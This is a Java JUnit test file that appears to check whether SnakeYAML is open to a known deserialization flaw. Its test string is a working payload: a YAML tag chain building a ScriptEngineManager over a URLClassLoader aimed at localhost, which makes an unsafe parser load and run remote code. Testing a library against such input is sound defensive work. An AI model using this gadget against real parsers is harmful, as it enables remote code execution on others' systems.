package hu.modeldriven.astah.validator;

import org.junit.Test;
import org.yaml.snakeyaml.Yaml;

import java.io.FileReader;
import java.io.Reader;
import java.io.StringReader;
import java.util.Map;

public class YamlSnakeCVETest {

    @Test
    public void testCVE() {

        String cveInput = "some_var: !!javax.script.ScriptEngineManager "+
                "[!!java.net.URLClassLoader [[!!java.net.URL [\"http://localhost:8080\"]]]]";

        try (Reader reader = new StringReader(cveInput)) {
            Yaml yamlParser = new Yaml();
            Map<String, Object> yamlData = yamlParser.load(reader);
            System.out.println(yamlData);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

}
